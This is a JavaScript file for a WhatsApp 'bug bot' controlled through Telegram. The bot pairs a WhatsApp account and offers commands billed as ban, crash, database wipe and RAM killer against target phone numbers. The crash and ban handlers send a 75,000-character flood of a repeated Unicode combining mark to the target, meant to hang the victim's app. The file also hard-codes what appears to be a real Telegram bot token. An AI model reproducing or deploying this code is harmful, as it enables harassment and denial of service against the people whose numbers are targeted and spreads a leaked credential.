const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    makeCacheableSignalKeyStore,
    Browsers,
    fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Telegraf, Markup } = require('telegraf');

// --- [ CONFIGURATION ] ---
const TG_TOKEN = '8655630932:AAECvnRecMAmBX44Ms-Rsp0gUwWdkWn-L5o';
const bot = new Telegraf(TG_TOKEN);
const owner = "Sasiya ROOT";
const logo = 'https://i.ibb.co/LzgMB0pj/image.jpg';

let sock;

async function startNexus() {
    // පරණ session මකලා අලුත්ම එකක් ගන්නවා
    const { state, saveCreds } = await useMultiFileAuthState('nexus_final_v26');
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: Browsers.macOS("Desktop"),
        syncFullHistory: false
    });

    sock.ev.on('creds.update', saveCreds);

    // --- [ TELEGRAM INTERFACE ] ---
    bot.start((ctx) => {
        ctx.replyWithPhoto(logo, {
            caption: `🛰️ ϟ **𝐍𝐄𝐗𝐔𝐒 𝐍𝐀𝐓𝐈𝐎𝐍𝐀𝐋 𝐁𝐔𝐆 𝐕𝟐𝟔** ϟ 🧬\n━━━━━━━━━━━━━━━━━━━━\n👤 **OPERATOR:** ${owner}\n🛰️ **STATUS:** ONLINE 🟢\n━━━━━━━━━━━━━━━━━━━━\n1. Use the button below to get Pairing Code.\n2. Link it in WhatsApp Settings.\n3. Type **.menu** in WhatsApp to start.`,
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([[Markup.button.callback('🔗 GET PAIRING CODE', 'get_code')]])
        });
    });

    bot.action('get_code', (ctx) => {
        ctx.reply("📱 **ENTER YOUR NUMBER (947xxxxxxxx):**");
        
        bot.on('text', async (numCtx) => {
            let num = numCtx.message.text.replace(/[^0-9]/g, '');
            if (num.length === 9) num = '94' + num;

            const waitMsg = await numCtx.reply("⏳ **AUTHORIZING PROTOCOLS...**\nPlease wait 15 seconds.");

            try {
                await delay(12000); // සර්වර් එක Synchronize වෙන්න වෙලාව දෙනවා
                let code = await sock.requestPairingCode(num);
                
                await bot.telegram.editMessageText(numCtx.chat.id, waitMsg.message_id, null, 
                `🔐 **YOUR PAIRING CODE:** \n\n\`${code}\` \n\n━━━━━━━━━━━━━━━━━━━━\n*Go to WhatsApp -> Linked Devices -> Link with Phone Number.*`, { parse_mode: 'Markdown' });
            } catch (err) {
                console.log(err);
                bot.telegram.editMessageText(numCtx.chat.id, waitMsg.message_id, null, "❌ **CONNECTION TIMEOUT:**\n\nRestart the Bot and try again in 15s.");
            }
        });
    });

    // --- [ WHATSAPP BUG MENU & LOGIC ] ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        const msg = chatUpdate.messages[0];
        if (!msg.message || msg.key.fromMe) return;
        const mText = (msg.message.conversation || msg.message.extendedTextMessage?.text || "").toLowerCase();
        const from = msg.key.remoteJid;

        if (mText === '.menu') {
            const bugMenu = `
🛰️ ϟ **𝐍𝐄𝐗𝐔𝐒 𝐍𝐀𝐓𝐈𝐎𝐍𝐀𝐋 𝐁𝐔𝐆 𝐕𝟐𝟔** ϟ 🧬
━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 **OPERATOR:** ${owner}
━━━━━━━━━━━━━━━━━━━━━━━━━━
🚫 **.ban [number]** - Permanent Ban
🔥 **.crash [number]** - Extreme Hang
📂 **.wipe [number]** - DB Destroyer
⚡ **.ram [number]** - RAM Killer
🧬 **.bin [number]** - Binary Flood

*Type a command to inject payload!*
━━━━━━━━━━━━━━━━━━━━━━━━━━
`;
            await sock.sendMessage(from, { text: bugMenu });
        }

        if (mText.startsWith('.crash') || mText.startsWith('.ban')) {
            const target = mText.split(" ")[1];
            if (!target) return sock.sendMessage(from, { text: "❌ Number missing!" });
            
            const targetId = target.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            await sock.sendMessage(from, { text: "🛠️ **INJECTING PAYLOAD...**" });
            
            const bugPayload = "ॣ".repeat(75000); 
            await sock.sendMessage(targetId, { text: bugPayload });
            await sock.sendMessage(from, { text: "✅ **SUCCESS:** Bug Delivered." });
        }
    });

    bot.launch();
}

startNexus();
